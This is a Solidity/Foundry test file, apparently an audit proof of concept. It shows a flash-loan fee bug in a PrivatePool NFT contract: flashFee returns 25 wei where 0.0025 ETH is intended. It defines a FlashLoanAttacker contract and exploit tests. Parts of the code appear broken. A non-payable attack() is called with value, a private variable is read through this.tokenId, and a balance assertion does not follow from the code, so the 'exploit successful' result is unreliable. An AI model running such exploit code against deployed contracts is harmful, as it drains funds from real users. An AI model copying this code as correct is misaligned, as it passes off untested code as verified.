// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {PrivatePool} from "../src/PrivatePool.sol";
import {Factory} from "../src/Factory.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashLender.sol";

// Mock NFT contract for testing
contract MockNFT is ERC721 {
    constructor() ERC721("Mock NFT", "MNFT") {}
    
    function mint(address to, uint256 tokenId) public {
        _mint(to, tokenId);
    }
}

// Mock ERC20 token for testing
contract MockToken is ERC20 {
    constructor() ERC20("Mock Token", "MTK", 18) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// Attacker contract that implements IERC3156FlashBorrower
contract FlashLoanAttacker is IERC3156FlashBorrower {
    PrivatePool pool;
    address nft;
    uint256 tokenId;
    
    constructor(address _pool, address _nft, uint256 _tokenId) {
        pool = PrivatePool(_pool);
        nft = _nft;
        tokenId = _tokenId;
    }
    
    function attack() external {
        // Initiate flash loan
        pool.flashLoan(this, nft, tokenId, "");
    }
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // Verify this is the correct callback
        require(msg.sender == address(pool), "Invalid caller");
        require(token == nft, "Invalid token");
        require(tokenId == this.tokenId, "Invalid tokenId");
        
        // The attacker can use the NFT here (e.g., sell it elsewhere, use it in another protocol)
        // For this PoC, we just return the NFT
        
        // Return the required callback value
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    // Allow the pool to transfer NFT back
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract PrivatePoolFlashFeeTest is Test {
    PrivatePool pool;
    Factory factory;
    MockNFT nft;
    MockToken token;
    FlashLoanAttacker attacker;
    
    address owner = address(0x1);
    address attackerAddress = address(0x2);
    
    function setUp() public {
        // Deploy mock contracts
        nft = new MockNFT();
        token = new MockToken();
        
        // Deploy factory (simplified for test)
        factory = new Factory(address(0), address(0), address(0));
        
        // Deploy pool (using minimal proxy pattern would require cloning, but for test we deploy directly)
        pool = new PrivatePool(address(factory), address(0), address(0));
        
        // Initialize pool with ETH as base token (address(0))
        vm.prank(address(factory));
        pool.initialize(
            address(0), // ETH as base token
            address(nft),
            100 ether, // virtualBaseTokenReserves
            10 ether,  // virtualNftReserves
            25,        // changeFee = 0.0025 ETH (4 decimals)
            100,       // feeRate = 1%
            bytes32(0), // no merkle root
            false,      // don't use stolen NFT oracle
            false       // don't pay royalties
        );
        
        // Mint NFT to pool
        uint256 tokenId = 1;
        nft.mint(address(pool), tokenId);
        
        // Deploy attacker contract
        attacker = new FlashLoanAttacker(address(pool), address(nft), tokenId);
        
        // Fund attacker with ETH for fees
        vm.deal(attackerAddress, 1 ether);
    }
    
    function testFlashFeeVulnerability() public {
        // Get the flash fee
        uint256 flashFee = pool.flashFee(address(nft), 1);
        
        // The changeFee is set to 25 (intended as 0.0025 ETH)
        // But flashFee returns 25 wei instead of 0.0025 ETH
        console.log("changeFee value:", pool.changeFee());
        console.log("flashFee returned:", flashFee);
        console.log("Expected flashFee (0.0025 ETH):", 0.0025 ether);
        console.log("Actual flashFee (25 wei):", 25 wei);
        
        // Verify the vulnerability
        assertEq(flashFee, 25, "Flash fee should be 25 wei (vulnerable)");
        assertTrue(flashFee != 0.0025 ether, "Flash fee should NOT be 0.0025 ETH");
        
        // The difference is 10^14 times (0.0025 ETH / 25 wei = 10^14)
        uint256 expectedFee = 0.0025 ether;
        uint256 actualFee = flashFee;
        uint256 ratio = expectedFee / actualFee;
        console.log("Fee ratio (expected/actual):", ratio);
        assertEq(ratio, 10**14, "Fee should be 10^14 times smaller than intended");
    }
    
    function testExploitFlashLoanWithReducedFee() public {
        // Get the flash fee
        uint256 flashFee = pool.flashFee(address(nft), 1);
        
        // Attacker executes flash loan
        vm.prank(attackerAddress);
        attacker.attack{value: flashFee}();
        
        // Verify the attacker only paid 25 wei instead of 0.0025 ETH
        assertEq(attackerAddress.balance, 1 ether - 25 wei, "Attacker should only pay 25 wei");
        
        // The pool received only 25 wei instead of 0.0025 ETH
        assertEq(address(pool).balance, 25 wei, "Pool received only 25 wei");
        
        console.log("Exploit successful: Attacker paid 25 wei instead of 0.0025 ETH");
        console.log("Loss to pool:", 0.0025 ether - 25 wei);
    }
    
    function testChangeFeeQuoteCorrectScaling() public {
        // Verify that changeFeeQuote correctly scales the fee
        (uint256 feeAmount,) = pool.changeFeeQuote(1 ether);
        
        // For 1 NFT (1e18 weight), fee should be 0.0025 ETH
        assertEq(feeAmount, 0.0025 ether, "Change fee should be correctly scaled");
        
        console.log("Change fee for 1 NFT:", feeAmount);
        console.log("Flash fee for 1 NFT:", pool.flashFee(address(nft), 1));
    }
}